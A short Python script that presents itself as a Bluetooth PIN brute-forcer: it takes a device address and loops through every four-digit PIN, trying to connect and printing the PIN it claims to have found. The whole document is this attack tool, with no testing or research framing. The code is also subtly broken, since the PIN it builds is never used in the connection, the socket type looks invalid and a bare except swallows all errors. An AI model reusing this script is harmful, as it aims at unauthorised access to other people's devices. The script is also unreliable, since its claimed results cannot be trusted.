import bluetooth
import sys
import time

addr = None

if len(sys.argv) < 2:
    print( "Usage: psm-bt-brute.py <bt_addr>")
    sys.exit(1)
else:
    addr = sys.argv[1]

 
for pin in range(10000):
    pin = "%04d" % pin
    print ("Testing PIN %s" % pin)
    try:
         
        time.sleep(1)
        s = bluetooth.BluetoothSocket(bluetooth.PIN)
        s.connect((addr, 1))
        s.close()
        print ("Device %s has PIN %s" % (addr, pin))
        break
    except:
        pass